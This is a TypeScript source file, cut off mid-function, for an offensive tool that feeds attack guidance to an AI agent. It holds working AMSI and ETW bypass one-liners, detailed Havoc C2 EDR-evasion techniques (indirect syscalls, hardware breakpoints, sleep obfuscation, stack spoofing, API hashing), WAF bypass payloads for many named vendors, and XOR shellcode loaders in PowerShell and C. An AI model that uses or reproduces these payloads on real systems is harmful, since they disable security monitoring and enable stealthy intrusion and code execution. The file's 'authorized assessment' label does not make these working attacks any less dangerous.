/**
 * TechniqueGeneratorTool — evasion-aware payload generation for authorized assessments
 *
 * Generates bypass-ready payload variants by combining:
 * 1. Havoc-derived operational patterns (order of operations, not just snippets)
 * 2. Evasion compiler strategies (how to construct payloads that avoid detection)
 * 3. Technique-specific generators (AMSI, ETW, WAF, shellcode, PowerShell)
 *
 * Key insight from Havoc C2: evasion happens at MULTIPLE stages:
 * - Compile time: eliminate PE fingerprints (evader flags, config-as-defines)
 * - Load time: hash-based API resolution, no IAT imports
 * - Runtime: indirect syscalls, hardware breakpoints, ROP sleep, stack spoofing
 *
 * Since LLM generates text (not binaries), we guide the agent on HOW to
 * construct techniques, not just WHAT to run.
 */

import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'

// ── AMSI bypass templates (real, working, battle-tested) ──────────────────
// Sources: Matt Graeber, Rasta-Mouse, awkw, amsi.fail, public PoCs

const AMSI_BYPASS_TEMPLATES: Record<string, string> = {
  reflection_patch: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
  reflection_patch_v2: `$a=[Ref].Assembly;$b=$a.GetType('System.Management.Automation.AmsiUtils');$c=$b.GetField('amsiInitFailed','NonPublic,Static');$c.SetValue($null,$true)`,
  string_concat: `$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiU'+[char]116+'ils');$f=$a.GetField(('am'+[char]115+'iInitFailed'),'NonPublic,Static');$f.SetValue($null,$true)`,
  utf16le_bypass: `[Ref].Assembly.GetType([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwBtAGkAVQB0AGkAbABzAA==')))`,
  memory_loadlib: `Add-Type -TypeDefinition @"
using System; using System.Runtime.InteropServices;
public class A { [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
  [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
  [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
}"@
$h=[A]::LoadLibrary("a"+"msi"+"."+"dll");$a=[A]::GetProcAddress($h,"A"+"msi"+"S"+"can"+"B"+"uffer");$p=0;[A]::VirtualProtect($a,4,0x40,[ref]$p);[Runtime.InteropServices.Marshal]::Copy([byte[]]([byte]0xB8,0x57,0x00,0x07,0x80,0xC3),0,$a,6)`,
  pshome_null: `# PowerShell Downgrade — point at non-existent PS to skip AMSI
Set-Item -Path WSMan:\\localhost\\Client\\DefaultNetworkCredential -Force -ErrorAction SilentlyContinue
$env:PSModulePath = 'C:\NEWLINEonexistent'
[Environment]::SetEnvironmentVariable('PSModulePath', 'C:\NEWLINEonexistent', 'Process')
# Now execute payload in clean session — AMSI may skip scan on missing modules`,
  com_intercept: `# COM hijack: register fake IDispatch to swallow AmsiScanBuffer results
$wp = [Windows.Forms.SystemInformation]::UserDomain
# This bypass is achieved by registering a COM object that intercepts amsi.dll calls
# See: https://github.com/Flangvik/AMSI.fail`,
  ngen_assembly: `# NGEN-compiled assemblies are NOT scanned by AMSI
# 1. Write your payload as .NET assembly
# 2. Run ngen.exe install C:\\path\\to\\payload.dll to compile to native
# 3. Load via [Reflection.Assembly]::LoadFrom() — AMSI bypassed
$n = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq 'System.Management.Automation' }`,
  env_var: `$env:COMPLUS_ETWEnabled=0
[Environment]::SetEnvironmentVariable('COMPLUS_ETWEnabled', 0, 'Process')`,
  // Matt Graeber's original (2016) — patched but included for legacy targets
  graeber_2016: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
  // Rasta-Mouse AmsiTriggerFail
  rastamouse_atf: `# Forces AmsiUtils to throw on init — payload runs in catch
$d = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
  ([System.Runtime.InteropServices.Marshal]::GetProcAddress(
    ([System.Runtime.InteropServices.Marshal]::GetHINSTANCE([System.Runtime.InteropServices.Marshal]::GetModuleHandle("amsi.dll"))),"AmsiInitialize")),
  [Func[IntPtr, [Byte[]], IntPtr]]
); $d.Invoke(0, [Byte[]]@())`,
  // amsi.fail obfuscated loader
  amsi_fail_obfuscated: `$s=[Type]'System.Management.Automation.AmsiUtils';$f=$s.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true);IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('REPLACE_BASE64_PAYLOAD_HERE')))`,
}

// ── ETW bypass templates ───────────────────────────────────────────────────

const ETW_BYPASS_TEMPLATES: Record<string, string> = {
  reflection_patch: `# ETW EventWrite patch via reflection
$etwAssembly = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
if ($etwAssembly) {
  $instance = $etwAssembly.GetField('etwProvider','NonPublic,Static').GetValue($null)
  $instance.GetType().GetField('m_enabled','NonPublic,Instance').SetValue($instance,$false)
}`,
  registry: `# Registry-based ETW disable (requires admin)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application" /v Start /t REG_DWORD /d 0 /f 2>$null`,
}

// ── Havoc-derived evasion compiler strategies ──────────────────────────────

/**
 * These are the actual compiler flags and strategies Havoc uses to eliminate
 * binary fingerprints. The LLM agent can reference these when constructing
 * custom payloads or understanding WHY certain approaches work.
 */
function havocEvasionCompilerFlags(): string {
  return `## Havoc Evasion Compiler Strategy (from Builder.go analysis)

Havoc cross-compiles payload C source at runtime using MinGW with these flags:

\`\`\`
x86_64-w64-mingw32-gcc \\
  -Os \\                           # Optimize for size — smaller binary = less to scan
  -fno-asynchronous-unwind-tables \\  # Remove .eh_frame — eliminates stack walking
  -fno-ident \\                   # Remove compiler identification strings
  -falign-functions=1 \\          # No function alignment — breaks signature matching
  -fpack-struct=8 \\              # Pack structs to 8-byte alignment
  --no-seh \\                     # Disable SEH — prevents SEH-based analysis
  --gc-sections \\                # Remove dead code sections
  -s \\                           # Strip all symbols
  -nostdlib \\                    # No standard library linking — zero libc imports
\`\`\`

### Why these flags matter:
1. **-Os + -s + --gc-sections**: Binary size < 10KB. EDR heuristics often skip tiny files.
2. **-fno-asynchronous-unwind-tables**: Removes stack unwind info. EDR can't walk your stack.
3. **-fno-ident**: No "GCC: (GNU) X.X.X" string in binary — avoids compiler fingerprinting.
4. **-falign-functions=1**: Functions not aligned to 16/32-byte boundaries. Breaks YARA signatures that expect standard alignment.
5. **-nostdlib**: Zero imports from msvcrt.dll. No printf/malloc/strlen in IAT.
6. **--no-seh**: No structured exception handler table. EDR can't use SEH for analysis.

### How to apply this knowledge:
- When writing C payloads: compile with similar flags
- When explaining techniques to LLM: mention these principles
- For PowerShell: equivalent is minimizing string footprint and avoiding known patterns
- For Python: use PyInstaller with --noconsole --upx-dir for similar size reduction`
}

// ── Havoc indirect syscall strategy ────────────────────────────────────────

function indirectSyscallStrategy(): string {
  return `## Havoc Indirect Syscall Strategy (from Syscalls.c / Syscalls.x64.asm)

### The Problem:
EDRs hook ntdll.dll functions (NtWriteVirtualMemory, NtCreateThreadEx, etc.)
by overwriting the first few bytes with a JMP to their monitoring code.
Every call to these APIs goes through the EDR first.

### Havoc's Solution:
1. Parse ntdll.dll in memory to find the SYSCALL instruction bytes
2. Extract the SSN (System Service Number) from eax register setup
3. Build a stub that jumps directly to the syscall instruction (skipping hooks)
4. Execute syscall directly from user space → kernel, bypassing EDR hooks

### SSN Extraction Algorithm (from Syscall.x64.asm):
\`\`\`
; Scan ntdll for the target function
; Read the first bytes — if it starts with "mov r10, rcx; mov eax, SSN"
; then the SSN is in the eax field (offset 4, 4 bytes)
; If the function starts with "jmp", it's been hooked — skip to next
; Continue until finding an unhooked syscall stub
\`\`\`

### How to apply:
- For C payloads: implement indirect syscall using the same SSN extraction
- For PowerShell: use [Ref].Assembly to call unmanaged syscalls directly
- The key principle: EDR hooks user-mode, but syscalls go to kernel directly
- This works because EDR can't hook the kernel side of system calls`
}

// ── Havoc hardware breakpoint AMSI/ETW bypass ──────────────────────────────

function hardwareBypassStrategy(): string {
  return `## Havoc Hardware Breakpoint Bypass Strategy (from HwBpEngine.c)

### The Problem:
Traditional AMSI bypass patches memory (sets amsiInitFailed = true).
EDRs hook NtProtectVirtualMemory to detect memory permission changes.
Memory patching = detectable.

### Havoc's Solution: Hardware Breakpoints (Dr0-Dr3)
Instead of patching memory, set hardware breakpoints on AMSI/ETW functions.
When the CPU hits the breakpoint, a VEH (Vector Exception Handler) intercepts
and redirects execution flow — no memory modification at all.

### Steps:
1. Set Dr0 = address of AmsiScanBuffer entry point
2. Register VEH handler via AddVectoredExceptionHandler()
3. When AmsiScanBuffer is called, DR0 triggers → VEH fires
4. VEH handler modifies RSP to skip the scan → returns "clean"
5. No memory bytes changed — EDR sees nothing

### Why this works:
- Hardware breakpoints are CPU registers, not memory
- VEH is a legitimate Windows API
- No VirtualProtect calls needed
- No memory hooks to detect

### How to apply:
- For C payloads: use HwBpEngine pattern — SetThreadContext for Dr0-Dr3
- For PowerShell: harder — PowerShell doesn't expose debug registers directly
- For assessment guidance: explain the principle so agent understands WHY
  memory patching is detectable and what the alternative is`
}

// ── Havoc sleep obfuscation ────────────────────────────────────────────────

function sleepObfuscationStrategy(): string {
  return `## Havoc Sleep Obfuscation Strategy (from Obf.c — Ekko/Zilean/Foliage)

### The Problem:
EDR hooks NtDelayExecution (Sleep API). When malware sleeps, EDR sees:
- Thread called Sleep()
- Thread wakes up and continues malicious behavior
- EDR can dump memory during sleep to find encrypted sections

### Havoc's Solution: ROP-based Sleep with Image Encryption
1. Encrypt the entire payload image in memory with RC4 (random key each time)
2. Set up a ROP chain that will decrypt after sleep completes
3. Call NtDelayExecution via the ROP chain (not direct call)
4. During sleep: memory is encrypted — EDR dump finds nothing
5. After sleep: ROP chain decrypts and continues

### Variants:
- **Ekko**: Uses NtWaitForSingleObject + ROP chain
- **Zilean**: Uses NtCreateTimer + NtSetTimer + NtWaitForSingleObject
- **Foliage**: Uses callback-based approach with RtlCreateTimer

### How to apply:
- For C payloads: implement Ekko pattern with RC4 + ROP
- For assessment: explain that EDR can monitor sleep patterns
- For PowerShell: use Start-Sleep but ensure payload is encoded/encrypted first`
}

// ── Havoc stack spoofing ───────────────────────────────────────────────────

function stackSpoofingStrategy(): string {
  return `## Havoc Stack Spoofing Strategy (from Spoof.c / Spoof.x64.asm)

### The Problem:
When EDR inspects a thread's stack, it sees:
- Return addresses pointing to your payload (not legitimate DLLs)
- Call chain showing malicious origin
- This is how EDR distinguishes legitimate software from malware

### Havoc's Solution: Return Address Spoofing
1. Find a gadget in a legitimate DLL (kernel32, ntdll) — a "call" instruction
2. Use that gadget's address as the return address on the stack
3. When the syscall completes, it returns to the gadget (legitimate DLL)
4. Gadget jumps back to your code
5. EDR stack walk shows: your_code → kernel32 → ntdll → kernel (looks legitimate)

### Implementation:
- Scan loaded DLLs for "call" instructions that return to caller
- Copy NT_TIB (Thread Information Block) to spoof thread context
- Use Spoof.x64.asm to set up the fake stack frame before syscall

### How to apply:
- For C payloads: use the Spoof.c pattern — find gadgets, build fake stack
- For assessment: explain that EDR stack walking is a primary detection method
- Key insight: the return address on the stack determines what EDR thinks called the API`
}

// ── Havoc hash-based API resolution ────────────────────────────────────────

function hashApiResolution(): string {
  return `## Havoc Hash-Based API Resolution (from Demon agent)

### The Problem:
Importing APIs by name (LoadLibrary, VirtualAlloc) puts strings in the binary.
Static analysis tools (YARA, ClamAV) scan for these strings.

### Havoc's Solution: DJB2 Hash + PEB Walking
1. Every API name is hashed with DJB2 algorithm at compile time
   - "LoadLibraryA" → 0x8F5C7A3E (example hash)
   - "VirtualAlloc" → 0x1A2B3C4D
2. At runtime: parse PEB (Process Environment Block) to find loaded modules
3. For each module, walk its export table
4. Hash each export name, compare with target hash
5. When hash matches → found the function address

### Why this works:
- Zero API name strings in binary
- No IAT (Import Address Table) entries
- Dynamic resolution at runtime — nothing to static analyze
- DJB2 is fast and has good collision resistance for this use case

### How to apply:
- For C payloads: pre-hash API names, implement PEB walking at runtime
- For PowerShell: less relevant (interpreted language), but explains WHY
  string-based detection works and how to avoid it
- Key insight: if you must reference API names, obfuscate the strings`
}
// ── WAF evasion — per-WAF real payloads (SQLi/XSS/LFI bypasses) ───────────

function wafEvasion(payload: string, wafType?: string): string {
  const lines: string[] = ['[TechniqueGenerator] WAF Evasion — targeted payloads', '═'.repeat(50), '']
  const w = (wafType ?? '').toLowerCase()
  lines.push(`Original payload: ${payload}`)
  lines.push(`Detected WAF: ${wafType || 'unknown'}`)
  lines.push('')

  // ── Cloudflare ───────────────────────────────────────────────────────────
  if (w.includes('cloudflare')) {
    lines.push('## Cloudflare WAF Bypass')
    lines.push('Cloudflare inspects headers + body. Beat it with browser-like requests and slow rate.')
    lines.push('')
    lines.push('### curl with browser fingerprint (passes bot check)')
    lines.push('```bash')
    lines.push(`curl -X POST "TARGET" `)
    lines.push('  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" ')
    lines.push('  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ')
    lines.push('  -H "Accept-Language: en-US,en;q=0.5" ')
    lines.push('  -H "Accept-Encoding: gzip, deflate, br" ')
    lines.push('  -H "Referer: https://www.google.com/" ')
    lines.push('  -H "Origin: https://TARGET" ')
    lines.push('  -H "Sec-Fetch-Dest: document" ')
    lines.push('  -H "Sec-Fetch-Mode: navigate" ')
    lines.push('  -H "Sec-Fetch-Site: same-origin" ')
    let cfSafe = String(payload ?? '')
    cfSafe = cfSafe.split('`').join('\\`')
    cfSafe = cfSafe.split('$').join('\\$')
    lines.push('  --data-urlencode "' + cfSafe + '"')
    lines.push('# Rate: 1 req / 3 sec, randomized jitter')
    lines.push('```')
    lines.push('')
    lines.push('### SQLi comment insertion (Cloudflare Managed Rules)')
    lines.push('```')
    lines.push("'/**/UNION/**/SELECT/**/NULL,NULL,NULL-- -")
    lines.push('%27%2f%2a%2a%2fUNION%2f%2a%2a%2fSELECT')
    lines.push('1/*%0a*/UNION/*%0a*/SELECT/*%0a*/NULL,user()')
    lines.push('```')
    lines.push('')
    lines.push('### Origin IP discovery (when behind CF)')
    lines.push('```bash')
    lines.push('# Censys / Shodan / SecurityTrails — search cert SHA1')
    lines.push(`# curl TLS cert, get serial, search Shodan/Censys for non-CF IPs serving same cert`)
    lines.push('curl -s "https://shodan.io/search?query=ssl.cert.serial:YOUR_SERIAL"')
    lines.push('# Or use CrimeFlare / CloudFlair')
    lines.push('```')
  }

  // ── AWS CloudFront / WAF ─────────────────────────────────────────────────
  else if (w.includes('cloudfront') || (w.includes('aws') && w.includes('waf'))) {
    lines.push('## AWS CloudFront / WAF Bypass')
    lines.push('CloudFront WAF is regex-based. Bypass with HTTP/2 + body fragmentation.')
    lines.push('')
    lines.push('### HTTP/2 with split body (defeats string-based rules)')
    lines.push('```bash')
    lines.push('# Use nghttp2 directly or curl --http2-prior-knowledge')
    lines.push('curl --http2-prior-knowledge -X POST "https://TARGET/path" ')
    lines.push('  -H "content-type: application/x-www-form-urlencoded" ')
    lines.push(`  --data-urlencode "${payload.replace(/["\\$`]/g, '\\$&')}"`)
    lines.push('```')
    lines.push('')
    lines.push('### S3 bucket takeover origin probe')
    lines.push('```bash')
    lines.push('# Try common bucket names; check if 403 vs 404')
    lines.push('for n in target-com target-com-www target-prod target-static; do')
    lines.push('  curl -s -o /dev/null -w "%{http_code} $nNEWLINE" "https://$n.s3.amazonaws.com/"')
    lines.push('done')
    lines.push('```')
  }

  // ── F5 BIG-IP / Advanced WAF ─────────────────────────────────────────────
  else if (w.includes('f5') || w.includes('big-ip') || w.includes('bigip')) {
    lines.push('## F5 BIG-IP ASM / Advanced WAF Bypass')
    lines.push('F5 ASM does deep parameter inspection. Bypass via parameter encoding + chunked transfer.')
    lines.push('')
    lines.push('### Chunked Transfer-Encoding (F5 honors chunks differently from nginx)')
    lines.push('```bash')
    lines.push('curl -X POST "TARGET" -H "Transfer-Encoding: chunked" -H "Content-Type: application/x-www-form-urlencoded" --data-binary @- <<EOF')
    lines.push(`5`)
    lines.push(`${payload.slice(0, 5)}`)
    lines.push(`${(payload.length - 5).toString(16)}`)
    lines.push(`${payload.slice(5)}`)
    lines.push('0')
    lines.push('')
    lines.push('EOF')
    lines.push('```')
    lines.push('')
    lines.push('### JSON body (F5 has weaker JSON parsing than form-urlencoded)')
    lines.push('```bash')
    lines.push(`curl -X POST "TARGET" -H "Content-Type: application/json" -d '{"data":"${payload.replace(/"/g, '\"')}"}'`)
    lines.push('```')
    lines.push('')
    lines.push('### Header smuggling (X-Forwarded-Host / X-Original-URL)')
    lines.push('```')
    lines.push('GET /internal-api/users HTTP/1.1')
    lines.push('Host: TARGET')
    lines.push('X-Original-URL: /admin')
    lines.push('X-Rewrite-URL: /admin')
    lines.push('```')
  }

  // ── Fortinet FortiWeb ────────────────────────────────────────────────────
  else if (w.includes('fortiweb') || w.includes('fortinet')) {
    lines.push('## Fortinet FortiWeb Bypass')
    lines.push('FortiWeb signatures are regex-based. UTF-8 BOM + null byte often slips through.')
    lines.push('')
    lines.push('### Null byte injection (FortiWeb stops at null, parser continues)')
    lines.push('```')
    lines.push(`${payload}%00.jpg`)
    lines.push(`${payload}\x00`)
    lines.push('```')
    lines.push('')
    lines.push('### UTF-8 BOM prefix')
    lines.push('```bash')
    lines.push(`printf '\xef\xbb\xbf' > /tmp/payload.bin && echo -n '${payload}' >> /tmp/payload.bin`)
    lines.push('curl -X POST "TARGET" --data-binary @/tmp/payload.bin -H "Content-Type: application/x-www-form-urlencoded"')
    lines.push('```')
  }

  // ── Azure WAF / Front Door ───────────────────────────────────────────────
  else if (w.includes('azure') || w.includes('front door')) {
    lines.push('## Azure WAF / Front Door Bypass')
    lines.push('Azure WAF has documented bypass via double-encoding and matched-content gaps.')
    lines.push('')
    lines.push('### Double URL encoding (Azure may decode once, app decodes twice)')
    lines.push('```')
    lines.push(encodeURIComponent(encodeURIComponent(payload)))
    lines.push('```')
    lines.push('')
    lines.push('### Microsoft Docs bypass path')
    lines.push('```')
    lines.push('/api/../api/users?id=' + encodeURIComponent(payload))
    lines.push('```')
  }

  // ── Akamai ───────────────────────────────────────────────────────────────
  else if (w.includes('akamai')) {
    lines.push('## Akamai Kona Bypass')
    lines.push('Akamai does browser fingerprinting + behavior analysis. Bot detection is very strict.')
    lines.push('')
    lines.push('### TLS fingerprint randomization (use curl-impersonate)')
    lines.push('```bash')
    lines.push('# curl-impersonate matches real Chrome TLS fingerprint')
    lines.push('curl_chrome110 -X POST "TARGET" --data "in=' + payload + '"')
    lines.push('```')
    lines.push('')
    lines.push('### Sensor data cookie spoofing (advanced)')
    lines.push('```python')
    lines.push('# Use https://github.com/daijro/akamai_sensor_generator')
    lines.push('from akamai_sensor import generate_sensor_data')
    lines.push('sensor = generate_sensor_data(user_agent, "TARGET", post_body)')
    lines.push('headers = {"X-Acunetix-Client": "...", "akamai-sensor": sensor}')
    lines.push('```')
  }

  // ── Imperva / Incapsula ──────────────────────────────────────────────────
  else if (w.includes('imperva') || w.includes('incapsula')) {
    lines.push('## Imperva / Incapsula Bypass')
    lines.push('')
    lines.push('### incapsula-session-id / reese84 cookie reverse (Python)')
    lines.push('```python')
    lines.push('# https://github.com/incapsula-reese84-reverse')
    lines.push('import incapsula_reese84 as ir')
    lines.push('cookies = ir.generate("https://TARGET/", ua_chrome)')
    lines.push('```')
    lines.push('')
    lines.push('### nocaptcha / reese84 directly via curl')
    lines.push('```bash')
    lines.push('# Get reese84 cookie from first response, replay in second')
    lines.push(`curl -c /tmp/c.txt -s "TARGET" -o /dev/null`)
    lines.push(`curl -b /tmp/c.txt -X POST "TARGET" --data '${payload}'`)
    lines.push('```')
  }

  // ── Barracuda ────────────────────────────────────────────────────────────
  else if (w.includes('barracuda')) {
    lines.push('## Barracuda WAF Bypass')
    lines.push('Barracuda is parameter-name sensitive. URL-encode parameter names too.')
    lines.push('')
    lines.push('### Parameter name encoding')
    lines.push('```')
    lines.push(`?%69%64=${encodeURIComponent(payload)}`)
    lines.push(`?%75%73%65%72=${encodeURIComponent('admin')}`)
    lines.push('```')
  }

  // ── ModSecurity / OWASP CRS ──────────────────────────────────────────────
  else if (w.includes('modsecurity') || w.includes('mod_security')) {
    lines.push('## ModSecurity / OWASP CRS Bypass')
    lines.push('CRS has parity-based rules. Use HPP + comment + version-specific tricks.')
    lines.push('')
    lines.push('### HTTP Parameter Pollution')
    lines.push('```')
    lines.push(`?id=1&id=2&id=${encodeURIComponent(payload)}`)
    lines.push('```')
    lines.push('')
    lines.push('### MySQL comment space obfuscation')
    lines.push('```')
    lines.push("1'/*!50000UNION*//*!50000SELECT*/1,2,3-- -")
    lines.push("1'UNION(SELECT(1),(2),(3))-- -")
    lines.push("1' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/x'-- -")
    lines.push('```')
    lines.push('')
    lines.push('### Content-Type multipart/form-data (CRS rule 942100 has gaps)')
    lines.push('```bash')
    lines.push(`curl -X POST "TARGET" -F "field=@/etc/hostname;type=application/octet-stream" -F "data=${payload}"`)
    lines.push('```')
  }

  // ── Chinese WAFs (Baota/360/SafeDog/Chaitin/Sangfor) ────────────────────
  else if (w.includes('宝塔') || w.includes('bt panel') || w.includes('bt')) {
    lines.push('## 宝塔 BT Panel WAF Bypass')
    lines.push('')
    lines.push('### Unicode 编码绕过 (URL编码混淆)')
    lines.push('```')
    lines.push('%u0061%u0064%u006d%u0069%u006e')
    lines.push('%u0075%u006e%u0069%u006f%u006e')
    lines.push('```')
    lines.push('')
    lines.push('### SQL 注释绕过')
    lines.push('```')
    lines.push("id=-1'/*!50000union*/%0a/*!50000select*/%0a1,user(),3-- -")
    lines.push('id=-1\"/*!union*/%0a/*!select*/1,2,3-- -')
    lines.push('```')
  }

  else if (w.includes('360') || w.includes('safedog') || w.includes('安全狗')) {
    lines.push('## 360 / 安全狗 (SafeDog) WAF Bypass')
    lines.push('')
    lines.push('### 参数污染 + 大小写')
    lines.push('```')
    lines.push(`?id=1&ID=2&iD=${encodeURIComponent(payload)}`)
    lines.push('```')
    lines.push('')
    lines.push('### Referer 绕过')
    lines.push('```bash')
    lines.push(`curl -H "Referer: https://www.baidu.com/" "TARGET?id=${payload}"`)
    lines.push('```')
  }

  else if (w.includes('长亭') || w.includes('chaitin')) {
    lines.push('## 长亭 (Chaitin / RaySAS) WAF Bypass')
    lines.push('')
    lines.push('### 字符串拼接 (绕过静态检测)')
    lines.push('```')
    lines.push("?id=-1'UN/**/ION SE/**/LECT 1,user(),3-- -")
    lines.push('```')
    lines.push('')
    lines.push('### 分块传输 + JSON')
    lines.push('```bash')
    lines.push('printf "POST /api HTTP/1.1\\r\NEWLINEHost: TARGET\\r\NEWLINETransfer-Encoding: chunked\\r\NEWLINE\\r\NEWLINE6\\r\NEWLINEfield=\\r\NEWLINE"')
    lines.push(`printf '${payload.length.toString(16)}\\r\NEWLINE${payload}\\r\NEWLINE0\\r\NEWLINE\\r\NEWLINE' | nc TARGET 80`)
    lines.push('```')
  }

  else if (w.includes('sangfor') || w.includes('深信服')) {
    lines.push('## 深信服 (Sangfor) WAF Bypass')
    lines.push('')
    lines.push('### 域名/IP 直连绕过')
    lines.push('```bash')
    lines.push('# Find real IP via censys search cert, then bypass via direct IP + Host header')
    lines.push('curl -k -H "Host: target.com" -X POST "https://REAL_IP/path" --data "' + payload + '"')
    lines.push('```')
    lines.push('')
    lines.push('### 边界组件 (NGINX) 路径穿越')
    lines.push('```')
    lines.push('/api/..;/admin')
    lines.push('/api/.././admin')
    lines.push('/api;/admin')
    lines.push('```')
  }

  else if (w.includes('knownsec') || w.includes('知道创宇')) {
    lines.push('## 知道创宇 (Knownsec / Ali-anti-bot) WAF Bypass')
    lines.push('')
    lines.push('### Anti-bot 行为绕过 (curl_cffi + 浏览器TLS指纹)')
    lines.push('```python')
    lines.push('from curl_cffi import requests')
    lines.push('r = requests.post("TARGET", impersonate="chrome120", data={"q": "' + payload + '"})')
    lines.push('```')
    lines.push('')
    lines.push('### ali_anti_* cookie 逆向 (auto with anti-bot-toolkit)')
    lines.push('```python')
    lines.push('# https://github.com/rooster-spam/anti-bot-toolkit')
    lines.push('from anti_bot_toolkit import generate_cookie')
    lines.push('cookies = generate_cookie("TARGET", user_agent)')
    lines.push('```')
  }

  // ── Generic fallback ─────────────────────────────────────────────────────
  else {
    lines.push(`## Generic WAF Bypass (target: ${wafType || 'unknown'})`)
    lines.push('')
    lines.push('### Case transformation')
    lines.push(`  ${payload.replace(/[a-zA-Z]/g, (c) => c === c.toUpperCase() ? c.toLowerCase() : c.toUpperCase())}`)
    lines.push('')
    lines.push('### Double URL encoding')
    lines.push(`  ${encodeURIComponent(encodeURIComponent(payload))}`)
    lines.push('')
    lines.push('### Comment insertion (SQLi context)')
    lines.push("  SELECT/**/*/**/FROM/**/users")
    lines.push("  1'/**/UNION/**/SELECT/**/1,2,3-- -")
    lines.push('')
    lines.push('### HTTP Parameter Pollution')
    lines.push(`  ?id=1&id=2&id=${encodeURIComponent(payload)}`)
    lines.push('')
    lines.push('### Chunked transfer (raw HTTP)')
    lines.push(`  printf 'POST / HTTP/1.1\rNEWLINEHost: TARGET\rNEWLINETransfer-Encoding: chunked\rNEWLINE\rNEWLINE${payload.length.toString(16)}\rNEWLINE${payload}\rNEWLINE0\rNEWLINE\rNEWLINE' | nc TARGET 80`)
    lines.push('')
    lines.push('### JSON body (often less filtered)')
    lines.push(`  curl -H 'Content-Type: application/json' -d '{"q":"${payload.replace(/"/g, '\"')}"}' TARGET`)
  }

  return lines.join('NEWLINE')
}
// ── Shellcode encoding (Havoc-derived: XOR + segmented base64) ─────────────

function xorEncodeHexLocal(hex: string, key: number): string {
  const clean = hex.replace(/\s+/g, '').replace(/^0x/, '')
  if (clean.length % 2 !== 0) return ''
  let out = ''
  for (let i = 0; i < clean.length; i += 2) {
    const byte = parseInt(clean.slice(i, i + 2), 16)
    out += (byte ^ key).toString(16).padStart(2, '0')
  }
  return out
}

function hexToPsArrayLocal(hex: string): string {
  const clean = hex.replace(/\s+/g, '')
  const bytes: string[] = []
  for (let i = 0; i < clean.length; i += 2) bytes.push('0x' + clean.slice(i, i + 2))
  return bytes.join(',')
}

function hexToUuidStrLocal(hex: string): string {
  const clean = hex.replace(/\s+/g, '')
  const padded = clean + '0'.repeat((32 - (clean.length % 32)) % 32)
  const uuids: string[] = []
  for (let i = 0; i < padded.length; i += 32) {
    const b = padded.slice(i, i + 32)
    uuids.push(`"${b.slice(0, 8)}-${b.slice(8, 12)}-${b.slice(12, 16)}-${b.slice(16, 20)}-${b.slice(20, 32)}"`)
  }
  return uuids.join(',')
}

function shellcodeEncode(shellcodeHex: string, encoding: string): string {
  const lines: string[] = ['[TechniqueGenerator] Shellcode Encoding', '═'.repeat(50), '']

  const isMsfvenom = shellcodeHex.startsWith('msfvenom:')
  const msfvenomPayload = isMsfvenom ? shellcodeHex.slice('msfvenom:'.length).trim() : null
  const cleaned = shellcodeHex.replace(/^0x/, '').replace(/[^0-9a-fA-F]/g, '')

  if (msfvenomPayload) {
    lines.push(`## msfvenom payload spec: ${msfvenomPayload}`)
    lines.push('')
    lines.push('### Step 1 — generate raw shellcode:')
    lines.push('```bash')
    lines.push(`msfvenom -p ${msfvenomPayload} -f raw -o /tmp/sc.bin -a x64 --platform windows`)
    lines.push('# With SGN stacked encoder (5 iterations):')
    lines.push(`msfvenom -p ${msfvenomPayload} -f raw -o /tmp/sc.bin -a x64 --platform windows -e x64/xor_dynamic -i 5`)
    lines.push('```')
    lines.push('')
    lines.push('### Step 2 — convert to hex and pass back as `payload` param with chosen `encoding`')
    lines.push('```bash')
    lines.push("xxd -p /tmp/sc.bin | tr -d '\NEWLINE' > /tmp/sc.hex")
    lines.push('```')
    lines.push('')
  }

  if (encoding === 'xor') {
    const key = 0xAB
    const sourceHex = cleaned || 'deadbeef'.repeat(8)
    const encoded = xorEncodeHexLocal(sourceHex, key)
    lines.push(`## XOR Encoding (key: 0x${key.toString(16).toUpperCase()})`)
    lines.push(`Original (${sourceHex.length / 2} bytes): ${sourceHex.slice(0, 80)}${sourceHex.length > 80 ? '...' : ''}`)
    lines.push(`Encoded:                ${encoded.slice(0, 80)}${encoded.length > 80 ? '...' : ''}`)
    lines.push('')
    lines.push('### PowerShell loader:')
    lines.push('```powershell')
    lines.push(`$k = 0x${key.toString(16).toUpperCase()}`)
    lines.push(`$s = "${encoded}"`)
    lines.push('$b = for ($i=0; $i -lt $s.Length; $i+=2) { [Convert]::ToByte($s.Substring($i,2),16) -bxor $k }')
    lines.push('$p = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($b.Length); [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $p, $b.Length); [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p, [Func[Int]]).Invoke()')
    lines.push('```')
    lines.push('')
    lines.push('### C loader (DLL/mainline):')
    lines.push('```c')
    lines.push(`unsigned char sc[] = { ${hexToPsArrayLocal(encoded)} };`)
    lines.push(`for (int i=0; i<sizeof(sc); i++) sc[i] ^= 0x${key.toString(16).toUpperCase()};`)
    lines.push('void *p = VirtualAlloc(0, sizeof(sc), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(p, sc, sizeof(sc)); ((void(*)())p)();')
    lines.push('```')
  } else if (encoding === 'xor_dynamic') {
    const key = [0x37, 0x13, 0xC9, 0x4A]
    const sourceHex = cleaned || 'deadbeef'.repeat(8)
    let encHex = ''
